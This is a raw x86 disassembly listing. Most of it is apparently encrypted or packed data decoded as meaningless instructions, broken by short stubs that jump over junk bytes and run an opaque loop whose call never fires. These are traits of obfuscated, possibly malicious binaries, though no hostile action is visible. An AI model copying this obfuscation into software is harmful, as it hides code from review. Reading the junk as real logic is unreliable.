  40cd62:	and    BYTE PTR [edi-0x2933c9c5],0xd8
  40cd69:	test   DWORD PTR [esi],ecx
  40cd6b:	dec    ebx
  40cd6c:	dec    ebx
  40cd6d:	or     ebx,DWORD PTR [esi+0x26a37162]
  40cd73:	daa    
  40cd74:	xor    BYTE PTR [eax-0x2d],cl
  40cd77:	dec    edx
  40cd78:	lea    eax,[eax+0x5d]
  40cd7b:	xchg   esi,eax
  40cd7c:	daa    
  40cd7d:	out    0xf2,al
  40cd7f:	lock pop esp
  40cd81:	lds    ecx,FWORD PTR [esi+0x69]
  40cd84:	mov    cl,0x6f
  40cd86:	ficom  WORD PTR [edx+ecx*2-0x1f]
  40cd8a:	add    bl,ah
  40cd8c:	fcmovb st,st(1)
  40cd8e:	cmp    DWORD PTR [edi],ebp
  40cd90:	mov    BYTE PTR [ebx],dh
  40cd92:	ins    DWORD PTR es:[edi],dx
  40cd93:	lea    ebp,[esi-0x57]
  40cd96:	in     al,dx
  40cd97:	jl     0x40cd27
  40cd99:	mov    ds:0x2cd734ff,eax
  40cd9e:	mov    ds:0x4aba158e,al
  40cda3:	dec    edi
  40cda4:	adc    al,0xfd
  40cda6:	or     al,0xd4
  40cda8:	mov    DWORD PTR [ebx],edx
  40cdaa:	or     al,0xf8
  40cdac:	inc    ecx
  40cdad:	lods   al,BYTE PTR ds:[esi]
  40cdae:	or     al,0xb0
  40cdb0:	imul   edi,DWORD PTR [esi-0x3cec6073],0x95572fff
  40cdba:	pop    edx
  40cdbb:	dec    eax
  40cdbc:	aam    0x18
  40cdbe:	in     eax,0x1a
  40cdc0:	retf   0x96d1
  40cdc3:	pusha  
  40cdc4:	dec    esp
  40cdc5:	inc    ebx
  40cdc6:	out    dx,eax
  40cdc7:	imul   BYTE PTR [ebp-0x7f9441d7]
  40cdcd:	bswap  edx
  40cdcf:	sub    BYTE PTR [ecx+0x2c],ah
  40cdd2:	push   edi
  40cdd3:	or     eax,0xfa6aa892
  40cdd8:	les    ecx,FWORD PTR [ecx]
  40cdda:	lods   eax,DWORD PTR ds:[esi]
  40cddb:	sub    ecx,esi
  40cddd:	mov    ebp,DWORD PTR [edi]
  40cddf:	jmp    0x40ce14
  40cde1:	jno    0x40ce4f
  40cde3:	add    al,ah
  40cde5:	repz fistp QWORD PTR [edi-0x79207ae1]
  40cdec:	(bad)  
  40cded:	or     dh,dh
  40cdef:	icebp  
  40cdf0:	jge    0x40cdb3
  40cdf2:	push   eax
  40cdf3:	jns    0x40cd9b
  40cdf5:	xor    al,0x63
  40cdf7:	or     al,0xb0
  40cdf9:	push   es
  40cdfa:	mov    cl,BYTE PTR [ecx-0x3010ef21]
  40ce00:	jp     0x40ce00
  40ce02:	and    dh,ah
  40ce04:	sub    DWORD PTR [edx],0x6c
  40ce07:	push   0x75
  40ce09:	scas   eax,DWORD PTR es:[edi]
  40ce0a:	(bad)  
  40ce0b:	pop    edx
  40ce0c:	clc    
  40ce0d:	aam    0x45
  40ce0f:	inc    ebp
  40ce10:	cmp    ebp,DWORD PTR [ecx-0x12]
  40ce13:	cmp    al,0x12
  40ce15:	out    dx,al
  40ce16:	dec    ebx
  40ce17:	mov    edx,0xb7c086ac
  40ce1c:	sub    DWORD PTR [eax],ebx
  40ce1e:	lea    eax,[edx+0x67]
  40ce21:	push   es
  40ce22:	in     al,0xd6
  40ce24:	or     eax,0x696e0d9f
  40ce29:	cdq    
  40ce2a:	push   esi
  40ce2b:	pop    ss
  40ce2c:	(bad)  [edi+eax*1+0x4ea92375]
  40ce33:	fisub  DWORD PTR ds:[eax]
  40ce36:	pop    ebp
  40ce37:	add    DWORD PTR [ebx+eax*1],ecx
  40ce3a:	inc    ebx
  40ce3b:	nop
  40ce3c:	sub    DWORD PTR [eax],ebx
  40ce3e:	ins    BYTE PTR es:[edi],dx
  40ce3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce40:	neg    BYTE PTR [ecx+0x74]
  40ce43:	cmp    eax,0x37160327
  40ce48:	fnsave [edi+0x470f1dc2]
  40ce4e:	sub    ah,ah
  40ce50:	inc    edi
  40ce51:	icebp  
  40ce52:	jl     0x40cea7
  40ce54:	push   esp
  40ce55:	rol    BYTE PTR [esi],cl
  40ce57:	adc    eax,0xf9056a2a
  40ce5c:	sbb    cl,BYTE PTR [edi+0x68fcbee3]
  40ce62:	xchg   esp,eax
  40ce63:	cmp    eax,0xe70b0ba7
  40ce68:	cmp    edx,DWORD PTR [eax+0x7d]
  40ce6b:	push   ebp
  40ce6c:	adc    BYTE PTR [eax+0x5d],cl
  40ce6f:	dec    esi
  40ce70:	push   esp
  40ce71:	or     ebp,DWORD PTR [ebx-0x4b]
  40ce74:	cmp    ebp,DWORD PTR [ecx+0x6de57d]
  40ce7a:	cmp    BYTE PTR [edi-0x6fb64cbd],dl
  40ce80:	or     BYTE PTR [eax],ch
  40ce82:	or     DWORD PTR [ecx],0xa2965fe8
  40ce88:	and    BYTE PTR [eax],dl
  40ce8a:	pop    ebp
  40ce8b:	push   ebp
  40ce8c:	push   esi
  40ce8d:	pop    edi
  40ce8e:	es retf 
  40ce90:	sti    
  40ce91:	imul   eax,DWORD PTR [edx-0x2f],0x56
  40ce95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce96:	fisttp DWORD PTR [ecx]
  40ce98:	jae    0x40ce3b
  40ce9a:	sub    BYTE PTR [esi+0x5087ede8],bh
  40cea0:	sub    BYTE PTR [edi],bl
  40cea2:	cdq    
  40cea3:	enter  0x6e9,0xbd
  40cea7:	arpl   WORD PTR [ebp-0x64b3609f],ax
  40cead:	rol    BYTE PTR [eax],0xb6
  40ceb0:	adc    dh,BYTE PTR [edx]
  40ceb2:	mov    esi,0xebec1545
  40ceb7:	pop    ds
  40ceb8:	loope  0x40cea7
  40ceba:	dec    ebx
  40cebb:	or     BYTE PTR [eax-0x42],dh
  40cebe:	mov    BYTE PTR [eax],bl
  40cec0:	lock xchg ebp,eax
  40cec2:	sub    BYTE PTR [ebp-0x4324b376],cl
  40cec8:	in     eax,0xb3
  40ceca:	in     al,0x91
  40cecc:	and    bh,dl
  40cece:	out    dx,al
  40cecf:	dec    ebp
  40ced0:	or     al,0x8e
  40ced2:	pop    esp
  40ced3:	sbb    al,0x1a
  40ced5:	ret    0x15a3
  40ced8:	jne    0x40cefe
  40ceda:	sub    al,0x87
  40cedc:	stc    
  40cedd:	push   ebx
  40cede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cedf:	or     dl,dh
  40cee1:	mov    ebp,0xe7eda0ee
  40cee6:	xor    eax,0x2a05f74
  40ceeb:	fldenv [esp+ebx*2]
  40ceee:	scas   al,BYTE PTR es:[edi]
  40ceef:	cmc    
  40cef0:	jbe    0x40cef1
  40cef2:	adc    edi,ebp
  40cef4:	xchg   edi,eax
  40cef5:	ficomp DWORD PTR [eax+0x61]
  40cef8:	mov    dl,BYTE PTR [esp+eiz*2+0x30]
  40cefc:	addr16 leave 
  40cefe:	push   ss
  40ceff:	call   0xb264:0x7da807a3
  40cf06:	iret   
  40cf07:	arpl   ax,sp
  40cf09:	jecxz  0x40cec4
  40cf0b:	pop    esp
  40cf0c:	neg    BYTE PTR [ebx]
  40cf0e:	fcomp  QWORD PTR [eax-0x7a16751f]
  40cf14:	jg     0x40cf00
  40cf16:	xor    eax,0x2d71ae0d
  40cf1b:	ja     0x40cf61
  40cf1d:	ds jns 0x40cf60
  40cf20:	lock (bad) 
  40cf22:	dec    esi
  40cf23:	sbb    DWORD PTR [edx-0x2],0x2c
  40cf27:	pop    ss
  40cf28:	not    BYTE PTR [edx+0x24481797]
  40cf2e:	mov    ebp,0xfe463d06
  40cf33:	adc    bh,BYTE PTR [eax+0x5540fb52]
  40cf39:	stos   BYTE PTR es:[edi],al
  40cf3a:	cs mov esp,0x12e7af4
  40cf40:	pop    ds
  40cf41:	jle    0x40cee2
  40cf43:	push   0x447c78c3
  40cf48:	xor    dl,BYTE PTR [eax+0x56]
  40cf4b:	ins    DWORD PTR es:[edi],dx
  40cf4c:	sub    edx,edi
  40cf4e:	fs push edi
  40cf50:	add    DWORD PTR [ebx+ecx*1-0x69],ebp
  40cf54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf55:	repz sbb eax,0xe6b14dba
  40cf5b:	and    DWORD PTR [ebx+0x60],0xe114596d
  40cf62:	cmp    BYTE PTR [esi],al
  40cf64:	sti    
  40cf65:	addr16 sti 
  40cf67:	stc    
  40cf68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf69:	ins    BYTE PTR es:[edi],dx
  40cf6a:	dec    eax
  40cf6b:	fidiv  WORD PTR [edx-0x45c5fc0f]
  40cf71:	mov    bh,0x52
  40cf73:	xor    ebx,DWORD PTR [eax+edi*1]
  40cf76:	jge    0x40cfed
  40cf78:	aas    
  40cf79:	or     eax,DWORD PTR [edx-0x6d]
  40cf7c:	stos   BYTE PTR es:[edi],al
  40cf7d:	retf   0x602b
  40cf80:	jnp    0x40cf06
  40cf82:	retf   
  40cf83:	push   ss
  40cf84:	lahf   
  40cf85:	sub    ebp,ebx
  40cf87:	pop    esi
  40cf88:	lds    eax,FWORD PTR [eax]
  40cf8a:	xchg   esi,eax
  40cf8b:	adc    DWORD PTR [edi],ecx
  40cf8d:	test   BYTE PTR [ebp-0x1a],dl
  40cf90:	(bad)  
  40cf91:	(bad)  
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	jbe    0x40cfcc
  40cfcc:	and    eax,0x78a72a25
  40cfd1:	js     0x40d008
  40cfd3:	jle    0x40d04d
  40cfd5:	js     0x40cff7
  40cfd7:	aam    0x5d
  40cfd9:	mov    ch,0x1f
  40cfdb:	stos   DWORD PTR es:[edi],eax
  40cfdc:	ret    0x26b1
  40cfdf:	pop    edx
  40cfe0:	popf   
  40cfe1:	retf   0x7264
  40cfe4:	push   si
  40cfe6:	cmp    esi,ecx
  40cfe8:	mov    bh,0x79
  40cfea:	mov    BYTE PTR [eax-0x47],ah
  40cfed:	ja     0x40cf7a
  40cfef:	xchg   edi,eax
  40cff0:	stos   DWORD PTR es:[edi],eax
  40cff1:	je     0x40cf85
  40cff3:	mov    ds:0xcbccce61,eax
  40cff8:	sbb    BYTE PTR [ebp+0x540185f2],ch
  40cffe:	xor    BYTE PTR [ebx-0x2ee381d4],bh
  40d004:	sar    ch,0xa8
  40d007:	fnclex 
  40d009:	(bad)  
  40d00a:	mov    ebp,0x33b9b1aa
  40d00f:	jns    0x40d01b
  40d011:	sbb    DWORD PTR [esi+0x38],eax
  40d014:	push   es
  40d015:	ret    
  40d016:	add    al,cl
  40d018:	sub    al,0x41
  40d01a:	push   cs
  40d01b:	and    BYTE PTR [ebp+ebp*4+0x5c0f65ef],dh
  40d022:	in     eax,dx
  40d023:	cmc    
  40d024:	dec    ecx
  40d025:	xchg   BYTE PTR [edx-0x3d24f8f4],al
  40d02b:	inc    ecx
  40d02c:	pop    esi
  40d02d:	out    dx,al
  40d02e:	dec    edx
  40d02f:	xchg   ebx,eax
  40d030:	and    ah,ah
  40d032:	test   eax,0x3d9c208e
  40d037:	sbb    edi,DWORD PTR [edi-0x2004ef7c]
  40d03d:	and    BYTE PTR [eax-0x24],al
  40d040:	push   edx
  40d041:	xchg   edi,eax
  40d042:	sbb    BYTE PTR [ebx],bh
  40d044:	add    eax,0x627fa711
  40d049:	es ins BYTE PTR es:[edi],dx
  40d04b:	mov    ah,0x8a
  40d04d:	cmp    BYTE PTR [edi-0x44],0xd4
  40d051:	mov    DWORD PTR [esi],0xc66b0a88
  40d057:	xchg   DWORD PTR [esi+0x5c],esi
  40d05a:	sar    DWORD PTR [eax+ecx*2],0xdd
  40d05e:	sub    eax,0x1717dbdf
  40d063:	mov    ds:0x5da1c59c,eax
  40d068:	pop    ds
  40d069:	ins    BYTE PTR es:[edi],dx
  40d06a:	rol    ebp,1
  40d06c:	lea    esp,[eax+0x7c]
  40d06f:	out    dx,eax
  40d070:	sbb    BYTE PTR [esi-0x5c],al
  40d073:	mov    dl,0xc9
  40d075:	retf   0xde23
  40d078:	sbb    al,BYTE PTR [eax+ebx*1+0x1c]
  40d07c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d07d:	sub    dl,BYTE PTR [edx+edx*8+0x77]
  40d081:	xchg   edi,eax
  40d082:	stc    
  40d083:	lods   al,BYTE PTR ds:[esi]
  40d084:	fmulp  st(5),st
  40d086:	push   ebp
  40d087:	sbb    BYTE PTR [edx-0x7f001152],0x4a
  40d08e:	mov    cl,0x49
  40d090:	int3   
  40d091:	pop    esp
  40d092:	sub    al,BYTE PTR [edi]
  40d094:	dec    ebx
  40d095:	mov    eax,0xf3abc172
  40d09a:	pop    ds
  40d09b:	iret   
  40d09c:	sub    eax,0x770f44ba
  40d0a1:	pop    ds
  40d0a2:	jmp    0xbc099cb2
  40d0a7:	mov    esp,esp
  40d0a9:	in     eax,0x1e
  40d0ab:	rcr    DWORD PTR [ecx-0x77],0x33
  40d0af:	das    
  40d0b0:	lods   eax,DWORD PTR ds:[esi]
  40d0b1:	xlat   BYTE PTR ds:[ebx]
  40d0b2:	dec    esp
  40d0b3:	ss repz mov edx,0x90c21026
  40d0ba:	das    
  40d0bb:	cmc    
  40d0bc:	sbb    ebp,DWORD PTR [eax+0xf492ce2]
  40d0c2:	sub    eax,0xddc1ff74
  40d0c7:	add    eax,0x922fcad2
  40d0cc:	inc    ecx
  40d0cd:	inc    ebp
  40d0ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0d0:	scas   eax,DWORD PTR es:[edi]
  40d0d1:	fnstsw WORD PTR [eax+eax*8+0x40]
  40d0d5:	inc    DWORD PTR [ecx]
  40d0d7:	imul   ebx,eax,0x93508a65
  40d0dd:	cmp    ah,BYTE PTR [edx]
  40d0df:	lahf   
  40d0e0:	or     dl,BYTE PTR [edi-0x53]
  40d0e3:	loop   0x40d0b5
  40d0e5:	add    DWORD PTR [eax+ebp*4-0x2b456510],0x25
  40d0ed:	(bad)  
  40d0ee:	test   BYTE PTR [esi],0x83
  40d0f1:	xor    eax,0xb7b7ffa
  40d0f6:	and    al,0x1f
  40d0f8:	(bad)  
  40d0f9:	mov    esi,0x8cbd0bbf
  40d0fe:	xor    DWORD PTR [edi-0xf],edx
  40d101:	sub    DWORD PTR [ebp+0x6e338587],0xb0231f79
  40d10b:	or     ebx,DWORD PTR [edx-0x60]
  40d10e:	push   ecx
  40d10f:	mov    dh,0x95
  40d111:	call   0xe7248fe1
  40d116:	ins    DWORD PTR es:[edi],dx
  40d117:	ret    0x57db
  40d11a:	mov    DWORD PTR [edi],ecx
  40d11c:	aam    0x72
  40d11e:	stos   DWORD PTR es:[edi],eax
  40d11f:	jns    0x40d15b
  40d121:	pop    esp
  40d122:	xchg   esp,eax
  40d123:	inc    edi
  40d124:	pop    eax
  40d125:	stc    
  40d126:	arpl   WORD PTR [ebp-0x6d0994cd],di
  40d12c:	shl    edx,cl
  40d12e:	pop    ss
  40d12f:	inc    edi
  40d130:	(bad)  
  40d131:	js     0x40d0ec
  40d133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d134:	mov    al,ds:0x3589819c
  40d139:	dec    esp
  40d13a:	push   ds
  40d13b:	xchg   DWORD PTR [ecx],esi
  40d13d:	sbb    DWORD PTR [eax+0x70228c3c],edx
  40d143:	sbb    al,BYTE PTR [eax]
  40d145:	mov    bl,BYTE PTR [edx]
  40d147:	leave  
  40d148:	retf   
  40d149:	xchg   esp,eax
  40d14a:	pop    ebx
  40d14b:	leave  
  40d14c:	icebp  
  40d14d:	cmp    esi,DWORD PTR [ebp+0x17]
  40d150:	mov    bl,0xb1
  40d152:	jmp    0xefd3fca6
  40d157:	jl     0x40d13a
  40d159:	enter  0x19eb,0x98
  40d15d:	lea    ebx,[eax]
  40d15f:	push   0x64a6fca9
  40d164:	add    edi,DWORD PTR [ebx]
  40d166:	popa   
  40d167:	fisttp WORD PTR ds:0x2fb5caa4
  40d16d:	lods   al,BYTE PTR ds:[esi]
  40d16e:	and    DWORD PTR [ecx-0x24],ebp
  40d171:	pop    ebx
  40d172:	loopne 0x40d1f2
  40d174:	test   eax,ebx
  40d176:	mov    DWORD PTR [ecx+0x77],esp
  40d179:	push   es
  40d17a:	jno    0x40d1a7
  40d17c:	xchg   ebp,eax
  40d17d:	cmp    bl,bl
  40d17f:	xchg   ebp,eax
  40d180:	mov    bl,0xbe
  40d182:	call   0x513a4d13
  40d187:	jl     0x40d1f2
  40d189:	jle    0x40d136
  40d18b:	xor    BYTE PTR [ecx+ebx*1+0x28715b23],dh
  40d192:	(bad)  
  40d193:	cli    
  40d194:	pop    ss
  40d195:	adc    ebp,DWORD PTR [ebx]
  40d197:	dec    ecx
  40d198:	out    0x21,al
  40d19a:	mov    bl,0x79
  40d19c:	inc    edi
  40d19d:	bound  esi,QWORD PTR [eax+0x31]
  40d1a0:	pop    eax
  40d1a1:	xor    eax,0xaccf6056
  40d1a6:	enter  0xb4f0,0xf8
  40d1aa:	loopne 0x40d1f2
  40d1ac:	mov    ch,0x8b
  40d1ae:	push   ebp
  40d1af:	fst    st(5)
  40d1b1:	adc    esp,esi
  40d1b3:	fs pop ss
  40d1b5:	jae    0x40d1ad
  40d1b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d1b8:	retf   
  40d1b9:	or     edi,DWORD PTR [eax+0x355eebb9]
  40d1bf:	jmp    0x40d17d
  40d1c1:	enter  0x7f90,0x4c
  40d1c5:	out    0xdc,al
  40d1c7:	dec    esi
  40d1c8:	xor    al,0xbb
  40d1ca:	lods   al,BYTE PTR ds:[esi]
  40d1cb:	jbe    0x40d15f
  40d1cd:	dec    ebp
  40d1ce:	adc    al,0x96
  40d1d0:	out    dx,al
  40d1d1:	xchg   ebp,eax
  40d1d2:	jae    0x40d1eb
  40d1d4:	scas   al,BYTE PTR es:[edi]
  40d1d5:	fcmovbe st,st(2)
  40d1d7:	(bad)  
  40d1d8:	mov    bh,0xb4
  40d1da:	inc    ecx
  40d1db:	dec    eax
  40d1dc:	pusha  
  40d1dd:	xor    eax,0x8f32364a
  40d1e2:	dec    ecx
  40d1e3:	imul   eax,esi,0xb1cc9964
  40d1e9:	in     al,dx
  40d1ea:	sahf   
  40d1eb:	jbe    0x40d216
  40d1ed:	or     ecx,DWORD PTR [esp+ebp*4-0x63793e32]
  40d1f4:	jae    0x40d219
  40d1f6:	and    BYTE PTR [ecx],bl
  40d1f8:	shl    ecx,1
  40d1fa:	test   al,0x14
  40d1fc:	sub    dl,BYTE PTR [ebp+0x1b]
  40d1ff:	clc    
  40d200:	neg    DWORD PTR [ebp+0x6601f911]
  40d206:	xchg   ecx,eax
  40d207:	imul   eax,esi,0x7d
  40d20a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d20b:	adc    esp,DWORD PTR [edx+0x1861e62d]
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	sub    eax,0xe7cd7514
  40d2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x7f78787e
  40d2c6:	daa    
  40d2c7:	repz push 0xa0788e4
  40d2cd:	dec    esi
  40d2ce:	jbe    0x40d265
  40d2d0:	mov    bh,0xd7
  40d2d2:	xor    cl,BYTE PTR [edx-0x4a]
  40d2d5:	dec    ebp
  40d2d6:	or     al,0xfa
  40d2d8:	idiv   bh
  40d2da:	nop
  40d2db:	out    dx,eax
  40d2dc:	sbb    eax,0xa0c1df11
  40d2e1:	push   ds
  40d2e2:	inc    eax
  40d2e3:	mov    ebp,DWORD PTR ds:0x93d6f2b1
  40d2e9:	inc    eax
  40d2ea:	das    
  40d2eb:	inc    edi
  40d2ec:	std    
  40d2ed:	xchg   esi,eax
  40d2ee:	sub    BYTE PTR [edx],ah
  40d2f0:	jmp    0xddce:0x9c50098f
  40d2f7:	pop    ebp
  40d2f8:	test   DWORD PTR [ebp+0x4a],esp
  40d2fb:	dec    bp
  40d2fd:	int3   
  40d2fe:	ret    0xceaa
  40d301:	jbe    0x40d2e8
  40d303:	out    dx,al
  40d304:	mov    esi,0x6f800b6c
  40d309:	(bad)  
  40d30a:	or     BYTE PTR [esi+eiz*2],ch
  40d30d:	xor    dl,BYTE PTR [edi+0x5d]
  40d310:	mov    dl,BYTE PTR [ecx]
  40d312:	xor    DWORD PTR [ecx+0x7f],ebx
  40d315:	aaa    
  40d316:	or     dl,BYTE PTR [ebx-0x4d6983b5]
  40d31c:	push   ebp
  40d31d:	inc    ebp
  40d31e:	fiadd  WORD PTR [edx+0xb32494e]
  40d324:	out    dx,eax
  40d325:	pop    ss
  40d326:	into   
  40d327:	push   es
  40d328:	mov    bl,0xc0
  40d32a:	xor    eax,0xaa6d62ab
  40d32f:	aaa    
  40d330:	test   BYTE PTR [edx-0x35],bh
  40d333:	stc    
  40d334:	sub    bl,0x2f
  40d337:	lds    esi,FWORD PTR [edx+0x42]
  40d33a:	mov    fs,WORD PTR [edi]
  40d33c:	sbb    DWORD PTR [eax],edi
  40d33e:	add    DWORD PTR [ecx],0xffffffff
  40d341:	in     eax,0xa8
  40d343:	jb     0x40d33c
  40d345:	(bad)  
  40d346:	fist   WORD PTR [ebp+eiz*8-0x13eacbe2]
  40d34d:	jne    0x40d2e1
  40d34f:	sub    ebx,DWORD PTR [ebx-0x41]
  40d352:	dec    ebx
  40d353:	jbe    0x40d3a5
  40d355:	xor    eax,0x8df17fba
  40d35a:	mov    gs,WORD PTR [esi+0x8]
  40d35d:	jb     0x40d337
  40d35f:	out    0xcf,eax
  40d361:	jmp    0x165a:0x355f60b2
  40d368:	fmul   st(7),st
  40d36a:	mov    cl,0x7b
  40d36c:	ins    DWORD PTR es:[edi],dx
  40d36d:	mov    esi,0xf5c9db8b
  40d372:	data16 cld 
  40d374:	pop    ebp
  40d375:	nop
  40d376:	cwde   
  40d377:	pop    edi
  40d378:	push   esp
  40d379:	aaa    
  40d37a:	hlt    
  40d37b:	pop    es
  40d37c:	mov    ah,0xed
  40d37e:	jg     0x40d378
  40d380:	xor    al,0x55
  40d382:	sbb    al,0x48
  40d384:	dec    BYTE PTR [bx+si+0x3]
  40d388:	cmp    DWORD PTR [eax+esi*2],esp
  40d38b:	jbe    0x40d385
  40d38d:	pop    ebx
  40d38e:	out    0x3e,al
  40d390:	shr    BYTE PTR [eax],1
  40d392:	and    eax,0x26e3e3e9
  40d397:	mov    DWORD PTR ds:[edi+0x7bdd29f3],ecx
  40d39e:	mov    dl,0xd8
  40d3a0:	mov    ds:0x3cc46256,al
  40d3a5:	lods   al,BYTE PTR ds:[esi]
  40d3a6:	pop    dx
  40d3a8:	inc    esi
  40d3a9:	sub    eax,0x153c3944
  40d3ae:	mov    WORD PTR [edi],ds
  40d3b0:	pushf  
  40d3b1:	int    0x90
  40d3b3:	aad    0x27
  40d3b5:	ja     0x40d427
  40d3b7:	cmp    DWORD PTR [ebx+0x12],ebp
  40d3ba:	int3   
  40d3bb:	test   eax,0xbeb0f16c
  40d3c0:	dec    ebx
  40d3c1:	int3   
  40d3c2:	(bad)  
  40d3c3:	push   ebx
  40d3c4:	iret   
  40d3c5:	bound  ecx,QWORD PTR [ebx-0x4bd4563c]
  40d3cb:	xor    eax,0xb0db97f
  40d3d0:	add    BYTE PTR [edx-0x611cfdde],bh
  40d3d6:	retf   
  40d3d7:	or     BYTE PTR [edx],al
  40d3d9:	pop    ecx
  40d3da:	jmp    0x40d3b4
  40d3dc:	push   ebp
  40d3dd:	mov    bl,0x67
  40d3df:	xor    DWORD PTR [eax],ecx
  40d3e1:	fs add eax,edi
  40d3e4:	jne    0x40d3a8
  40d3e6:	or     BYTE PTR [ecx-0x720c6f72],dh
  40d3ec:	xchg   edx,eax
  40d3ed:	imul   edi,DWORD PTR [eax-0x552a54cd],0xf6f54d01
  40d3f7:	add    ecx,ecx
  40d3f9:	xchg   esp,eax
  40d3fa:	inc    edx
  40d3fb:	sub    eax,0xbf2cd0da
  40d400:	aad    0xef
  40d402:	dec    ebp
  40d403:	out    0x36,eax
  40d405:	mov    DWORD PTR ds:0xd4b0813,ecx
  40d40b:	outs   dx,BYTE PTR ds:[esi]
  40d40c:	mov    es,eax
  40d40e:	call   0x75c6230b
  40d413:	(bad)  
  40d415:	adc    ebx,DWORD PTR [ecx]
  40d417:	mul    BYTE PTR [ebp+edi*1+0xa]
  40d41b:	xor    ebp,0x2d639b62
  40d421:	int    0x17
  40d423:	mov    eax,0x8ba25be3
  40d428:	hlt    
  40d429:	xchg   ecx,eax
  40d42a:	sbb    esp,esi
  40d42c:	adc    BYTE PTR [edi-0x76],dl
  40d42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d430:	inc    ebx
  40d431:	cwde   
  40d432:	add    ah,bl
  40d434:	cwde   
  40d435:	sbb    eax,0xb6c0d17c
  40d43a:	test   dl,ah
  40d43c:	in     eax,dx
  40d43d:	mov    al,ds:0xa2f6afa7
  40d442:	sub    al,0xda
  40d444:	pop    esi
  40d445:	inc    edi
  40d446:	sbb    eax,0x4c6bacf4
  40d44b:	lahf   
  40d44c:	bound  esi,QWORD PTR [edi+0x7a]
  40d44f:	push   eax
  40d450:	mov    edi,0xee426cf9
  40d455:	icebp  
  40d456:	scas   eax,DWORD PTR es:[edi]
  40d457:	inc    edi
  40d458:	shl    dl,0x28
  40d45b:	inc    ecx
  40d45c:	mov    ecx,0x85622e45
  40d461:	ins    BYTE PTR es:[edi],dx
  40d462:	sub    eax,0x9ad7549a
  40d467:	popf   
  40d468:	les    edx,FWORD PTR [edx-0x779636bc]
  40d46e:	jbe    0x40d4cd
  40d470:	and    eax,0xd56b756e
  40d475:	mov    ch,0x5d
  40d477:	jbe    0x40d499
  40d479:	push   cs
  40d47a:	and    eax,0xe24282c6
  40d47f:	mov    ebx,ecx
  40d481:	push   ds
  40d482:	jne    0x40d4ad
  40d484:	outs   dx,BYTE PTR ds:[esi]
  40d485:	add    al,0xec
  40d487:	hlt    
  40d488:	inc    eax
  40d489:	inc    ebp
  40d48a:	adc    ecx,DWORD PTR [ebp+0x2fd51e93]
  40d490:	punpckldq mm0,mm2
  40d493:	ins    BYTE PTR es:[edi],dx
  40d494:	(bad)  
  40d495:	stc    
  40d496:	sub    eax,0x38bcee2
  40d49b:	repz inc ecx
  40d49d:	fild   WORD PTR [ecx-0x31]
  40d4a0:	sub    eax,0xc2efa7d5
  40d4a5:	in     al,0x9a
  40d4a7:	std    
  40d4a8:	xchg   BYTE PTR [ebx-0x31],al
  40d4ab:	enter  0x4e12,0xb1
  40d4af:	lock or eax,edi
  40d4b2:	mov    ds:0xbed59bc1,eax
  40d4b7:	cmp    DWORD PTR [esi+0x7b227d59],edi
  40d4bd:	push   ds
  40d4be:	(bad)  [edi+0x49]
  40d4c1:	adc    ch,BYTE PTR [ecx-0x32ea37ca]
  40d4c7:	dec    esp
  40d4c8:	ins    BYTE PTR es:[edi],dx
  40d4c9:	inc    esi
  40d4ca:	mov    al,ds:0x3aa310a1
  40d4cf:	data16 mov dh,0x56
  40d4d2:	nop
  40d4d3:	jmp    0x40d4a4
  40d4d5:	popa   
  40d4d6:	mov    bh,0x35
  40d4d8:	mov    edx,0xf6f42b3e
  40d4dd:	pushf  
  40d4de:	lock int3 
  40d4e0:	lahf   
  40d4e1:	imul   ebp,esi,0x2a0f8408
  40d4e7:	mov    ebx,0x8d9ede66
